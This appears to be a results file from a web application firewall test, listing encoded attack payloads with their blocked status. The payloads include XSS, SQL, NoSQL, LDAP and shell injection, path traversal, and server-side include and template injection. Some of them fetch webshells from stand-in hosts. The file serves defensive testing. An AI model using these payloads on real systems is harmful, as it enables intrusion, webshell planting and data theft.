Payload,Check Status,Response Code,Placeholder,Encoder,Set,Case,Test Result
&gt%3B+src+onerror=confirm&amp%3Blpar%3B1&amp%3Brpar%3B&lt%3B,blocked,403,JSONRequest,URL,community,community-xss,passed
%22%3E%3C%2Ftextarea%3E%3CScRiPt%3Eprompt%281%29%3C%2FScRiPt%2F%2F%20%22%3E%3Ciframe%2Fonload=alert%281%29%2F%2F%20%E2%80%9D%2F%3E&_lt%3B_script%3Ealert%281%29&_lt%3B%2Fscr_ipt&gt%E2%80%9D%2F%3E,blocked,403,JSONRequest,URL,community,community-xss,passed
%7B%60%20%3Cbody%20%5C%3C%20onscroll%20=1%28_=prompt%2C_%28String.fromCharCode%2888%2C83%2C83%2C32%2C66%2C121%2C32%2C77%2C111%2C114%2C112%2C104%2C105%2C110%2C101%29%29%29%3E%C2%B4%7D,blocked,403,JSONRequest,URL,community,community-xss,passed
%3Csvg%250Aonauxclick=0%3B%5B1%5D.some%28confirm%29%2F%2F,blocked,403,JSONRequest,URL,community,community-xss,passed
%28xss%22%3E%3C%21--%3E%3Csvg%2Fonload=alert%28document.domain%29%3E%29,blocked,403,JSONRequest,URL,community,community-xss,passed
%2522onauxclick=alert%60xss%60+a,blocked,403,JSONRequest,URL,community,community-xss,passed
%3Ciframe%2Fonload=%27this%5B%22src%22%5D=%22javas&Tab%3Bcript:al%22+%22ert%60%60%22%27%3B%3E,blocked,403,JSONRequest,URL,community,community-xss,passed
%3Ciframe%2Fonload=%27this%5B%22src%22%5D=%22jav%22+%22as&Tab%3Bcr%22+%22ipt:al%22+%22er%22+%22t%28%29%22%27%3B%3E,blocked,403,JSONRequest,URL,community,community-xss,passed
%3Cj%20id=x%20style=%22-webkit-user-modify:read-write%22%20onfocus=%7Bwindow.onerror=eval%7Dthrow%2F0%2F+name%3EH%3C%2Fj%3E%23x,blocked,403,JSONRequest,URL,community,community-xss,passed
data:text%2Fhtml%2C%3Cform%20action=https:%2F%2F127.0.0.1%2Fxss-cp.php%20method=post%3E%3Cinput%20type=hidden%20name=a%20value=%22%3Cimg%2Fsrc=%2F%2F127.0.0.1%2Fyt.jpg%20onpointerenter=alert%601%60%3E%22%3E%3Cinput%20type=submit%3E%3C%2Fform%3E,blocked,403,JSONRequest,URL,community,community-xss,passed
%3Cj%20id=x%20style=%22-webkit-user-modify:read-write%22%20onfocus=%7Bwindow.onerror=eval%7Dthrow%2F0%2F+name%3EH%3C%2Fj%3E%23x,blocked,403,JSONRequest,URL,community,community-xss,passed
%3C%21%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E,blocked,403,JSONRequest,URL,community,community-xss,passed
%0d%0aSet-Cookie:crlf=injection,blocked,403,URLPath,Plain,owasp,crlf,passed
%0a%0dSet-cookie:crlf=injection,blocked,403,URLPath,Plain,owasp,crlf,passed
%25%30%41Set-cookie:crlf=injection,blocked,403,URLPath,Plain,owasp,crlf,passed
%25%30%44%25%30%41Set-cookie:crlf=injection,blocked,403,URLPath,Plain,owasp,crlf,passed
%25%0a%0aSet-cookie:crlf=injection,blocked,403,URLPath,Plain,owasp,crlf,passed
%25%30%41%25%30%44Set-cookie:crlf=injection,blocked,403,URLPath,Plain,owasp,crlf,passed
%e5%98%8dSet-cookie%3acrlf%3dinjection,blocked,403,URLPath,Plain,owasp,crlf,passed
KCYodWlkPWFkbWluKSghKCYoMT0wKSh1c2VyUGFzc3dvcmQ9cSkpKSk,blocked,403,JSONRequest,Base64Flat,owasp,ldap-injection,passed
%28&%28uid=admin%29%28%21%28&%281=0%29%28userPassword=q%29%29%29%29,blocked,403,JSONRequest,URL,owasp,ldap-injection,passed
Kih8KG9iamVjdGNsYXNzPSopKQ,blocked,403,JSONRequest,Base64Flat,owasp,ldap-injection,passed
%2A%28%7C%28objectclass=%2A%29%29,blocked,403,JSONRequest,URL,owasp,ldap-injection,passed
dXNlclBhc3N3b3JkOjIuNS4xMy4xODo9MTIz,blocked,403,JSONRequest,Base64Flat,owasp,ldap-injection,passed
userPassword:2.5.13.18:=123,blocked,403,JSONRequest,URL,owasp,ldap-injection,passed
DQpWMTAwIENBUEFCSUxJVFkNClYxMDEgRkVUQ0ggNDc5MQ,blocked,403,URLPath,Base64Flat,owasp,mail-injection,passed
%0D%0AV100%20CAPABILITY%0D%0AV101%20FETCH%204791,blocked,403,URLPath,URL,owasp,mail-injection,passed
DQpRVUlUDQo,blocked,403,URLPath,Base64Flat,owasp,mail-injection,passed
%0D%0AQUIT%0D%0A,blocked,403,URLPath,URL,owasp,mail-injection,passed
ClJDUFQgVE86IHRlc3RAZXZpbC5jb20K,blocked,403,URLPath,Base64Flat,owasp,mail-injection,passed
%0ARCPT%20TO:%20test@evil.com%0A,blocked,403,URLPath,URL,owasp,mail-injection,passed
ZGIuaW5qZWN0aW9uLmluc2VydCh7c3VjY2VzczoxfSk7,blocked,403,URLPath,Base64Flat,owasp,nosql-injection,passed
db.injection.insert%28%7Bsuccess:1%7D%29%3B,blocked,403,URLPath,URL,owasp,nosql-injection,passed
ZGIuaW5qZWN0aW9uLmluc2VydCh7c3VjY2VzczoxfSk7,blocked,403,JSONRequest,Base64Flat,owasp,nosql-injection,passed
dHJ1ZSwgJHdoZXJlOiAnOTkgPT0gODgn,blocked,403,URLPath,Base64Flat,owasp,nosql-injection,passed
db.injection.insert%28%7Bsuccess:1%7D%29%3B,blocked,403,JSONRequest,URL,owasp,nosql-injection,passed
dHJ1ZSwgJHdoZXJlOiAnOTkgPT0gODgn,blocked,403,JSONRequest,Base64Flat,owasp,nosql-injection,passed
true%2C%20$where:%20%2799%20==%2088%27,blocked,403,URLPath,URL,owasp,nosql-injection,passed
JywgJG9yOiBbIHt9LCB7ICdvcmRlcic6J29yZGVy,blocked,403,URLPath,Base64Flat,owasp,nosql-injection,passed
true%2C%20$where:%20%2799%20==%2088%27,blocked,403,JSONRequest,URL,owasp,nosql-injection,passed
JywgJG9yOiBbIHt9LCB7ICdvcmRlcic6J29yZGVy,blocked,403,JSONRequest,Base64Flat,owasp,nosql-injection,passed
%27%2C%20$or:%20%5B%20%7B%7D%2C%20%7B%20%27order%27:%27order,blocked,403,URLPath,URL,owasp,nosql-injection,passed
%27%2C%20$or:%20%5B%20%7B%7D%2C%20%7B%20%27order%27:%27order,blocked,403,JSONRequest,URL,owasp,nosql-injection,passed
O3ZhciBkYXRlID0gbmV3IERhdGUoKTsgZG97Y3VyRGF0ZSA9IG5ldyBEYXRlKCk7fXdoaWxlKGN1ckRhdGUtZGF0ZQ,blocked,403,URLPath,Base64Flat,owasp,nosql-injection,passed
O3ZhciBkYXRlID0gbmV3IERhdGUoKTsgZG97Y3VyRGF0ZSA9IG5ldyBEYXRlKCk7fXdoaWxlKGN1ckRhdGUtZGF0ZQ,blocked,403,JSONRequest,Base64Flat,owasp,nosql-injection,passed
%3Bvar%20date%20=%20new%20Date%28%29%3B%20do%7BcurDate%20=%20new%20Date%28%29%3B%7Dwhile%28curDate-date,blocked,403,URLPath,URL,owasp,nosql-injection,passed
MDt2YXIgZGF0ZT1uZXcgRGF0ZSgpOyBkb3tjdXJEYXRlID0gbmV3IERhdGUoKTt9d2hpbGUoY3VyRGF0ZS1kYXRlPDEwMDAwKQ,blocked,403,URLPath,Base64Flat,owasp,nosql-injection,passed
%3Bvar%20date%20=%20new%20Date%28%29%3B%20do%7BcurDate%20=%20new%20Date%28%29%3B%7Dwhile%28curDate-date,blocked,403,JSONRequest,URL,owasp,nosql-injection,passed
MDt2YXIgZGF0ZT1uZXcgRGF0ZSgpOyBkb3tjdXJEYXRlID0gbmV3IERhdGUoKTt9d2hpbGUoY3VyRGF0ZS1kYXRlPDEwMDAwKQ,blocked,403,JSONRequest,Base64Flat,owasp,nosql-injection,passed
0%3Bvar%20date=new%20Date%28%29%3B%20do%7BcurDate%20=%20new%20Date%28%29%3B%7Dwhile%28curDate-date%3C10000%29,blocked,403,URLPath,URL,owasp,nosql-injection,passed
0%3Bvar%20date=new%20Date%28%29%3B%20do%7BcurDate%20=%20new%20Date%28%29%3B%7Dwhile%28curDate-date%3C10000%29,blocked,403,JSONRequest,URL,owasp,nosql-injection,passed
L3N0YXRpYy9pbWcvLi4vLi4vZXRjL3Bhc3N3ZA,blocked,401,URLPath,Base64Flat,owasp,path-traversal,passed
%2Fstatic%2Fimg%2F..%2F..%2Fetc%2Fpasswd,blocked,404,URLPath,URL,owasp,path-traversal,passed
L3N0YXRpYy9pbWcvLi4vLi4vZXRjL3Bhc3N3ZA,blocked,401,JSONRequest,Base64Flat,owasp,path-traversal,passed
XFw6OjFcYyRcdXNlcnNcZGVmYXVsdFxudHVzZXIuZGF0,blocked,403,URLPath,Base64Flat,owasp,path-traversal,passed
%2Fstatic%2Fimg%2F..%2F..%2Fetc%2Fpasswd,blocked,403,JSONRequest,URL,owasp,path-traversal,passed
%5C%5C::1%5Cc$%5Cusers%5Cdefault%5Cntuser.dat,blocked,403,URLPath,URL,owasp,path-traversal,passed
XFw6OjFcYyRcdXNlcnNcZGVmYXVsdFxudHVzZXIuZGF0,blocked,403,JSONRequest,Base64Flat,owasp,path-traversal,passed
%5C%5C::1%5Cc$%5Cusers%5Cdefault%5Cntuser.dat,blocked,403,JSONRequest,URL,owasp,path-traversal,passed
ax--exec=%60id%60--remote=origin,blocked,401,URLPath,URL,owasp,rce-urlpath,passed
%3B%20cat%20%2Fet%27c%2Fpa%27ss%27wd,blocked,403,URLPath,URL,owasp,rce-urlpath,passed
cmd=127.0.0.1%20&&%20ls%20%2Fetc,blocked,403,URLPath,URL,owasp,rce-urlpath,passed
ax--exec=`id`--remote=origin,blocked,401,JSONRequest,Plain,owasp,rce,passed
; cat /et'c/pa'ss'wd,blocked,403,JSONRequest,Plain,owasp,rce,passed
cmd=127.0.0.1 && ls /etc,blocked,403,JSONRequest,Plain,owasp,rce,passed
O3dnZXQgaHR0cDovL3NvbWVfaG9zdC9zaDMxMS5zaA,blocked,403,JSONRequest,Base64Flat,owasp,shell-injection,passed
%3Bwget%20http:%2F%2Fsome_host%2Fsh311.sh,blocked,403,JSONRequest,URL,owasp,shell-injection,passed
fGdldGVudCtob3N0cytzb21laG9zdC5idXJwY29sbGFib3JhdG9yLm5ldC4m,blocked,403,JSONRequest,Base64Flat,owasp,shell-injection,passed
%7Cgetent+hosts+somehost.burpcollaborator.net.&,blocked,403,JSONRequest,URL,owasp,shell-injection,passed
O2dldGVudCRJRlMkOWhvc3RzJElGUyQ5c29tZWhvc3QuYnVycGNvbGxhYm9yYXRvci5uZXQ7ZWNobyRJRlMkOSQoKDM0ODIqNzMwMSkpOw,blocked,403,JSONRequest,Base64Flat,owasp,shell-injection,passed
%3Bgetent$IFS$9hosts$IFS$9somehost.burpcollaborator.net%3Becho$IFS$9$%28%283482%2A7301%29%29%3B,blocked,403,JSONRequest,URL,owasp,shell-injection,passed
fCBzZXQgL2EgMzQ4Mio3MzAx,blocked,403,JSONRequest,Base64Flat,owasp,shell-injection,passed
%7C%20set%20%2Fa%203482%2A7301,blocked,403,JSONRequest,URL,owasp,shell-injection,passed
KHNlbGVjdCgwKWZyb20oc2VsZWN0KHNsZWVwKDE1KSkpdikvKicrKHNlbGVjdCgwKWZyb20oc2VsZWN0KHNsZWVwKDE1KSkpdikrJyUyMisoc2VsZWN0KDApZnJvbShzZWxlY3Qoc2xlZXAoMTUpKSl2KSslMjIqLw,blocked,403,URLPath,Base64Flat,owasp,sql-injection,passed
KHNlbGVjdCgwKWZyb20oc2VsZWN0KHNsZWVwKDE1KSkpdikvKicrKHNlbGVjdCgwKWZyb20oc2VsZWN0KHNsZWVwKDE1KSkpdikrJyUyMisoc2VsZWN0KDApZnJvbShzZWxlY3Qoc2xlZXAoMTUpKSl2KSslMjIqLw,blocked,403,JSONRequest,Base64Flat,owasp,sql-injection,passed
%28select%280%29from%28select%28sleep%2815%29%29%29v%29%2F%2A%27+%28select%280%29from%28select%28sleep%2815%29%29%29v%29+%27%2522+%28select%280%29from%28select%28sleep%2815%29%29%29v%29+%2522%2A%2F,blocked,403,URLPath,URL,owasp,sql-injection,passed
%28select%280%29from%28select%28sleep%2815%29%29%29v%29%2F%2A%27+%28select%280%29from%28select%28sleep%2815%29%29%29v%29+%27%2522+%28select%280%29from%28select%28sleep%2815%29%29%29v%29+%2522%2A%2F,blocked,403,JSONRequest,URL,owasp,sql-injection,passed
MzsvKiBhICovIERFQ0xBUkUgQGMgdmFyY2hhcigyNTUpOy8qIGIgKi9TRUxFQ1QgQGM9J3BpbmcgJyttYXN0ZXIuc3lzLmZuX3ZhcmJpbnRvaGV4c3RyKGNvbnZlcnQodmFyYmluYXJ5LFNZU1RFTV9VU0VSKSkrJy4wMDAuYnVycGNvbCcrJ2xhYm9yYXRvci5uZXQnOy8qeHgqLyBFWEVDIE1hc3Rlci5kYm8ueHBfY21kc2hlbGwgQGM7Lyp4eHgqLyBFWEVDIHNwX1NZU19Qcm90b09wIEBpZD0z,blocked,403,URLPath,Base64Flat,owasp,sql-injection,passed
MzsvKiBhICovIERFQ0xBUkUgQGMgdmFyY2hhcigyNTUpOy8qIGIgKi9TRUxFQ1QgQGM9J3BpbmcgJyttYXN0ZXIuc3lzLmZuX3ZhcmJpbnRvaGV4c3RyKGNvbnZlcnQodmFyYmluYXJ5LFNZU1RFTV9VU0VSKSkrJy4wMDAuYnVycGNvbCcrJ2xhYm9yYXRvci5uZXQnOy8qeHgqLyBFWEVDIE1hc3Rlci5kYm8ueHBfY21kc2hlbGwgQGM7Lyp4eHgqLyBFWEVDIHNwX1NZU19Qcm90b09wIEBpZD0z,blocked,403,JSONRequest,Base64Flat,owasp,sql-injection,passed
3%3B%2F%2A%20a%20%2A%2F%20DECLARE%20@c%20varchar%28255%29%3B%2F%2A%20b%20%2A%2FSELECT%20@c=%27ping%20%27+master.sys.fn_varbintohexstr%28convert%28varbinary%2CSYSTEM_USER%29%29+%27.000.burpcol%27+%27laborator.net%27%3B%2F%2Axx%2A%2F%20EXEC%20Master.dbo.xp_cmdshell%20@c%3B%2F%2Axxx%2A%2F%20EXEC%20sp_SYS_ProtoOp%20@id=3,blocked,403,URLPath,URL,owasp,sql-injection,passed
3%3B%2F%2A%20a%20%2A%2F%20DECLARE%20@c%20varchar%28255%29%3B%2F%2A%20b%20%2A%2FSELECT%20@c=%27ping%20%27+master.sys.fn_varbintohexstr%28convert%28varbinary%2CSYSTEM_USER%29%29+%27.000.burpcol%27+%27laborator.net%27%3B%2F%2Axx%2A%2F%20EXEC%20Master.dbo.xp_cmdshell%20@c%3B%2F%2Axxx%2A%2F%20EXEC%20sp_SYS_ProtoOp%20@id=3,blocked,403,JSONRequest,URL,owasp,sql-injection,passed
LTExMzQnKSAgT1IgSlNPTl9FWFRSQUNUKCd7JydhS0VSJyc6IDk2NDh9JywgJyQuYUtFUicpID0gOTY0OCo3Nzk5IEFORCAoJ1FsWWEnIExJS0UgJ1FsWWE,blocked,403,URLPath,Base64Flat,owasp,sql-injection,passed
LTExMzQnKSAgT1IgSlNPTl9FWFRSQUNUKCd7JydhS0VSJyc6IDk2NDh9JywgJyQuYUtFUicpID0gOTY0OCo3Nzk5IEFORCAoJ1FsWWEnIExJS0UgJ1FsWWE,blocked,403,JSONRequest,Base64Flat,owasp,sql-injection,passed
-1134%27%29%20%20OR%20JSON_EXTRACT%28%27%7B%27%27aKER%27%27:%209648%7D%27%2C%20%27$.aKER%27%29%20=%209648%2A7799%20AND%20%28%27QlYa%27%20LIKE%20%27QlYa,blocked,403,URLPath,URL,owasp,sql-injection,passed
-1134%27%29%20%20OR%20JSON_EXTRACT%28%27%7B%27%27aKER%27%27:%209648%7D%27%2C%20%27$.aKER%27%29%20=%209648%2A7799%20AND%20%28%27QlYa%27%20LIKE%20%27QlYa,blocked,403,JSONRequest,URL,owasp,sql-injection,passed
MTIzKSBBTkQgMTI9MTIgIEFORCBKU09OX0RFUFRIKCd7fScpICE9IDI1MjE,blocked,403,URLPath,Base64Flat,owasp,sql-injection,passed
MTIzKSBBTkQgMTI9MTIgIEFORCBKU09OX0RFUFRIKCd7fScpICE9IDI1MjE,blocked,403,JSONRequest,Base64Flat,owasp,sql-injection,passed
123%29%20AND%2012=12%20%20AND%20JSON_DEPTH%28%27%7B%7D%27%29%20%21=%202521,blocked,403,JSONRequest,URL,owasp,sql-injection,passed
123%29%20AND%2012=12%20%20AND%20JSON_DEPTH%28%27%7B%7D%27%29%20%21=%202521,blocked,403,URLPath,URL,owasp,sql-injection,passed
PCEtLSNleGVjIGNtZD0id2dldCBodHRwOi8vc29tZV9ob3N0L3NoZWxsLnR4dCB8IHJlbmFtZSBzaGVsbC50eHQgc2hlbGwucGhwIi0tPg,blocked,403,URLPath,Base64Flat,owasp,ss-include,passed
%3C%21--%23exec%20cmd=%22wget%20http:%2F%2Fsome_host%2Fshell.txt%20%7C%20rename%20shell.txt%20shell.php%22--%3E,blocked,403,URLPath,URL,owasp,ss-include,passed
PCEtLSNleGVjIGNtZD0ibHMiIC0tPg,blocked,403,URLPath,Base64Flat,owasp,ss-include,passed
%3C%21--%23exec%20cmd=%22ls%22%20--%3E,blocked,403,URLPath,URL,owasp,ss-include,passed
PCEtLSNleGVjIGNtZD0iZGlyIiAtLT4,blocked,403,URLPath,Base64Flat,owasp,ss-include,passed
%3C%21--%23exec%20cmd=%22dir%22%20--%3E,blocked,403,URLPath,URL,owasp,ss-include,passed
PCNhc3NpZ24gZXggPSAiZnJlZW1hcmtlci50ZW1wbGF0ZS51dGlsaXR5LkV4ZWN1dGUiP25ldygpPiR7IGV4KCJpZCIpfQ,blocked,403,URLPath,Base64Flat,owasp,sst-injection,passed
%3C%23assign%20ex%20=%20%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E$%7B%20ex%28%22id%22%29%7D,blocked,403,URLPath,URL,owasp,sst-injection,passed
YWFhYVx1MDAyNyUyYiN7MTYqODc4N30lMmJcdTAwMjdiYmI,blocked,403,URLPath,Base64Flat,owasp,sst-injection,passed
aaaa%5Cu0027%252b%23%7B16%2A8787%7D%252b%5Cu0027bbb,blocked,403,URLPath,URL,owasp,sst-injection,passed
e3sxMzM3KjEzMzh9fQ,blocked,403,URLPath,Base64Flat,owasp,sst-injection,passed
%7B%7B1337%2A1338%7D%7D,blocked,403,URLPath,URL,owasp,sst-injection,passed
PGJvZHkgb25sb2FkPWFsZXJ0KCd0ZXN0MScpPg,blocked,403,URLPath,Base64Flat,owasp,xss-scripting,passed
%3Cbody%20onload=alert%28%27test1%27%29%3E,blocked,403,URLPath,URL,owasp,xss-scripting,passed
PElNRyBTUkM9aiYjWDQxdmFzY3JpcHQ6YWxlcnQoJ3Rlc3QnKT4,blocked,403,URLPath,Base64Flat,owasp,xss-scripting,passed
%3CIMG%20SRC=j&%23X41vascript:alert%28%27test%27%29%3E,blocked,403,URLPath,URL,owasp,xss-scripting,passed
Im9ud2hlZWw9ZWFkKDExMSk,blocked,403,URLPath,Base64Flat,owasp,xss-scripting,passed
%22onwheel=ead%28111%29,blocked,403,URLPath,URL,owasp,xss-scripting,passed
X19wcm90b19fW3YtaWZdPV9jLmNvbnN0cnVjdG9yKCdhbGVydCgxKScpKCk,blocked,403,URLPath,Base64Flat,owasp,xss-scripting,passed
__proto__%5Bv-if%5D=_c.constructor%28%27alert%281%29%27%29%28%29,blocked,403,URLPath,URL,owasp,xss-scripting,passed
c29tZXRleHQ8c3ZnIG9ubG9hZD1hbGVydChkb2N1bWVudC5kb21haW4pPj9taW1lVHlwZT10ZXh0L2h0bWw,blocked,403,URLPath,Base64Flat,owasp,xss-scripting,passed
sometext%3Csvg%20onload=alert%28document.domain%29%3E%3FmimeType=text%2Fhtml,blocked,403,URLPath,URL,owasp,xss-scripting,passed
IikpO2lmKCFzZWxmLngpc2VsZi54PSFhbGVydChkb2N1bWVudC5kb21haW4pfWNhdGNoKGUpe30vLw,blocked,403,URLPath,Base64Flat,owasp,xss-scripting,passed
%22%29%29%3Bif%28%21self.x%29self.x=%21alert%28document.domain%29%7Dcatch%28e%29%7B%7D%2F%2F,blocked,403,URLPath,URL,owasp,xss-scripting,passed
PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KGRvY3VtZW50LmRvbWFpbik+L2FsbA,blocked,403,URLPath,Base64Flat,owasp,xss-scripting,passed
%3Cimg%20src=x%20onerror=alert%28document.domain%29%3E%2Fall,blocked,403,URLPath,URL,owasp,xss-scripting,passed
Y29uZmlybS5jYWxsKG51bGwsMSk,blocked,403,URLPath,Base64Flat,owasp,xss-scripting,passed
confirm.call%28null%2C1%29,blocked,403,URLPath,URL,owasp,xss-scripting,passed
amF2YXNjcmlwdDpzZXRJbnRlcnZhbCgnYWxlJysncnQoZG9jdW1lbnQuZG9tYWluKScp,blocked,403,URLPath,Base64Flat,owasp,xss-scripting,passed
javascript:setInterval%28%27ale%27+%27rt%28document.domain%29%27%29,blocked,403,URLPath,URL,owasp,xss-scripting,passed
amF2YXNjcmlwdDpzZXRJbnRlcnZhbCgnZmV0JysnY2goZG9jdW1lbnQuZG9tYWluKScp,blocked,403,URLPath,Base64Flat,owasp,xss-scripting,passed
javascript:setInterval%28%27fet%27+%27ch%28document.domain%29%27%29,blocked,403,URLPath,URL,owasp,xss-scripting,passed
amF2YXNjcmlwdDpzZXRJbnRlcnZhbCgnY29uJysnZmlybShkb2N1bWVudC5kb21haW4pJyk,blocked,403,URLPath,Base64Flat,owasp,xss-scripting,passed
javascript:setInterval%28%27con%27+%27firm%28document.domain%29%27%29,blocked,403,URLPath,URL,owasp,xss-scripting,passed
amF2YXNjcmlwdDpzZXRJbnRlcnZhbCgncHJvbScrJ3B0KGRvY3VtZW50LmRvbWFpbiknKQ,blocked,403,URLPath,Base64Flat,owasp,xss-scripting,passed
javascript:setInterval%28%27prom%27+%27pt%28document.domain%29%27%29,blocked,403,URLPath,URL,owasp,xss-scripting,passed
YWxlcnQuY2FsbCglMjAsICJYU1MiKTs,blocked,403,URLPath,Base64Flat,owasp,xss-scripting,passed
alert.call%28%2520%2C%20%22XSS%22%29%3B,blocked,403,URLPath,URL,owasp,xss-scripting,passed
KGFsZXJ0KSgxKQ,blocked,403,URLPath,Base64Flat,owasp,xss-scripting,passed
%28alert%29%281%29,blocked,403,URLPath,URL,owasp,xss-scripting,passed
PHN2Zy9vbmxvYWQ9YWxlcnQoPVJORD0pLy8,blocked,403,URLPath,Base64Flat,owasp,xss-scripting,passed
%3Csvg%2Fonload=alert%28=RND=%29%2F%2F,blocked,403,URLPath,URL,owasp,xss-scripting,passed
Im9uQ2xpY2s9Iihwcm9tcHQpKDEp,blocked,403,URLPath,Base64Flat,owasp,xss-scripting,passed
%22onClick=%22%28prompt%29%281%29,blocked,403,URLPath,URL,owasp,xss-scripting,passed
Jz5hbGVydCgxKTwvc2NyaXB0PjxzY3JpcHQvMT0n,blocked,403,URLPath,Base64Flat,owasp,xss-scripting,passed
%27%3Ealert%281%29%3C%2Fscript%3E%3Cscript%2F1=%27,blocked,403,URLPath,URL,owasp,xss-scripting,passed
Ii8vT254PSIiLy9vbmZvY3VzPXByb21wdCgxKT4,blocked,403,URLPath,Base64Flat,owasp,xss-scripting,passed
%22%2F%2FOnx=%22%22%2F%2Fonfocus=prompt%281%29%3E,blocked,403,URLPath,URL,owasp,xss-scripting,passed
Ik9ueD0oKSBvbk1vdVNlb1Zlcj1wcm9tcHQoMSk+,blocked,403,URLPath,Base64Flat,owasp,xss-scripting,passed
%22Onx=%28%29%20onMouSeoVer=prompt%281%29%3E,blocked,403,URLPath,URL,owasp,xss-scripting,passed
Ik9uQ2xpQ2s9Iihwcm9tcHRgMWAp,blocked,403,URLPath,Base64Flat,owasp,xss-scripting,passed
%22OnCliCk=%22%28prompt%601%60%29,blocked,403,URLPath,URL,owasp,xss-scripting,passed
cHJvbXB0LmNhbGwobnVsbCwxKQ,blocked,403,URLPath,Base64Flat,owasp,xss-scripting,passed
prompt.call%28null%2C1%29,blocked,403,URLPath,URL,owasp,xss-scripting,passed
YWxlcnQuYXBwbHkobnVsbCwgWzFdKQ,blocked,403,URLPath,Base64Flat,owasp,xss-scripting,passed
alert.apply%28null%2C%20%5B1%5D%29,blocked,403,URLPath,URL,owasp,xss-scripting,passed
